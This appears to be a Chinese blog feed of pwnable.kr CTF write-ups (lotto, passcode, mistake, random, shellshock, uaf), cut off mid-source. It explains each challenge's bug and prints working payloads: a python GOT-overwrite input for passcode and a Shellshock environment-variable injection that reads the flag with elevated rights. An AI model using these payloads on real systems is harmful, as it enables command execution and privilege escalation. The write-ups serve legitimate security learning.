<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
<p>将flag的值存放到dest中，直接查看flag即可</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>lotto</title>
    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/1.png" class></strong></p>
<h3 id="查看lotto-c源代码"><a href="#查看lotto-c源代码" class="headerlink" title="查看lotto.c源代码"></a>查看lotto.c源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> r;</span><br><span class="line">        r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">        <span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// generate lotto numbers</span></span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">                lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;         <span class="comment">// 1 ~ 45</span></span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate lotto score</span></span><br><span class="line">        <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                                match++;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// win!</span></span><br><span class="line">        <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"> 		<span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?				     method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// menu</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line">            </span><br><span class="line">             	<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                play();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                help();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的大致逻辑为，用户输入6个字符，如果与系统中<a href="https://zh.wikipedia.org/wiki//dev/random">/dev/urandom</a>随机生成的数相同，累计可以达到6分则最后可拿到flag。显然，需要寻找措施进行绕过，重点在于play函数。</p>
<h3 id="查看play函数"><a href="#查看play函数" class="headerlink" title="查看play函数"></a>查看play函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/2.png" class></strong></p>
<p>判断用户输入的字符和随机数是否相同本应该是一重for循环，而这里使用了两重for循环，判断的是要求的每一位只要我们输入的6位中存在就可以了，不管是哪一位都可以，只要有六个相等就好了。那只需要一直尝试同一个字符串，总有一次人品好。另外，注意这里随机生成的字符ASCII码范围为1~45，参照<a href="https://blog.csdn.net/jinduozhao/article/details/75398793">ASCII码表</a>，只有 DEC 33 开始才是可见字符，所以需要输入的字符为 ASCII DEC 33 到 45 。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>可以编写python脚本，也可以直接自己多次重复输入。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/3.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>passcode</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/11.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/1.png" class></strong></p>
<h3 id="查看passcode-c源文件"><a href="#查看passcode-c源文件" class="headerlink" title="查看passcode.c源文件"></a>查看passcode.c源文件</h3><p><strong></strong></p>
<p>第一反应为使得passcode1为338150、passcode2为13371337，之后调用system函数。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/3.png" class></strong></p>
<p>login函数中要求输入两个密码passcode1和passcode2，但scanf函数用法错误，其后并没有加上&amp;符号取其地址，而是直接使用了栈上两个没有初始化的随机值，因此直接输入则会出现segmentation fault。因此考虑在login函数之前执行的welcome函数。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/4.png" class></strong></p>
<p>welcome函数要求用户输入姓名的字符串，但是允许输入100字节长度，因此尝试使用其覆盖栈上两个变量的“随机值”。</p>
<h3 id="gdb-passcode查看其汇编代码"><a href="#gdb-passcode查看其汇编代码" class="headerlink" title="gdb passcode查看其汇编代码"></a>gdb passcode查看其汇编代码</h3><h4 id="disassemble-r-welcome"><a href="#disassemble-r-welcome" class="headerlink" title="disassemble /r welcome"></a>disassemble /r welcome</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/5.png" class></strong></p>
<h4 id="disassemble-r-login"><a href="#disassemble-r-login" class="headerlink" title="disassemble /r login"></a>disassemble /r login</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/6.png" class></strong></p>
<p>发现char数组在$ebp - 0x70$处，而passcode1、passcode2分别在$ebp - 0x10、ebp - 0xc$处，其相差的距离$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$，因此并不能直接通过输入姓名字符串覆盖变量passcode2,只可以覆盖passcode1。</p>
<h3 id="转换思路"><a href="#转换思路" class="headerlink" title="转换思路"></a>转换思路</h3><h4 id="查看文件保护措施"><a href="#查看文件保护措施" class="headerlink" title="查看文件保护措施"></a>查看文件保护措施</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/7.png" class></strong></p>
<p>栈上开启了Canary机制，因此栈溢出很难成功，发现没有开启PIE，因此可以通过修改某些函数got表的地址，进行调用system函数。实际上，既然scanf是一个具有写功能的函数，我们完全可以利用scanf来修改此后使用到的某个函数的got表项。例如，程序在<strong>scanf(“%d”, passcode1);**后立即使用了</strong>fflush函数<strong>，所以我们完全可以先找到fflush的got表项地址（程序没有开PIE，无需leak），把passcode1布局为该地址，并在调用到scanf(“%d”, passcode1)时输入程序代码中调用</strong>system(“/bin/cat flag”);**处的地址，这样执行fflush函数时就会执行system函数。</p>
<p><strong>注意这里区分got表本身的地址和写入got表项中的地址</strong></p>
<h4 id="fflush函数的地址"><a href="#fflush函数的地址" class="headerlink" title="fflush函数的地址"></a>fflush函数的地址</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/8.png" class></strong></p>
<p>fflush地址为$0x0804a004$</p>
<h4 id="system函数的地址"><a href="#system函数的地址" class="headerlink" title="system函数的地址"></a>system函数的地址</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/9.png" class></strong></p>
<p>这里注意system函数需要将参数先压栈之后再调用，即真正调用的函数地址为$0x080485e3$，即在printf函数之后执行。</p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27; * 96 + &#x27;\x04\xa0\x04\x08&#x27; + &#x27;134514147\n&#x27;&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>

<p>因为passcode是输入int型，即输入$0x080485e3 = 134514147$。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/10.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>mistake</title>
    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/1.png" class></strong></p>
<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/2.png" class></strong></p>
<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/3.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>random</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/2.png" class></strong></p>
<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/3.png" class></strong></p>
<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/4.png" class></strong></p>
<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/5.png" class></strong></p>
<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/6.png" class></strong></p>
<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/7.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>shellshock</title>
    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/1.png" class></strong></p>
<h3 id="查看shellshock-c源文件"><a href="#查看shellshock-c源文件" class="headerlink" title="查看shellshock.c源文件"></a>查看shellshock.c源文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/2.png" class></strong></p>
<p>程序依次运行三个函数*<a href="https://www.man7.org/linux/man-pages/man2/setresgid.2.html">setresuid、setresgid</a>、system*</p>
<h3 id="查看程序的执行权限"><a href="#查看程序的执行权限" class="headerlink" title="查看程序的执行权限"></a>查看程序的执行权限</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/3.png" class></strong></p>
<p>以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p>
<p><strong>这个组权限对于flag文件来说是可读的（r–）</strong>，但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/4.png" class></strong></p>
<p>实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KEY=x</span><br><span class="line">VALUE=() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure>

<p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。</p>
<p>于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>运行下面语句拿到flag</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock</span><br></pre></td></tr></table></figure>

<p><strong></strong></p>
<p>关于shellshock漏洞相关知识可参考：</p>
<p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&wd=&eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
<p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>uaf</title>
    <url>/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/2.png" class></strong></p>
<h3 id="查看uaf-cpp文件源代码"><a href="#查看uaf-cpp文件源代码" class="headerlink" title="查看uaf.cpp文件源代码"></a>查看uaf.cpp文件源代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span 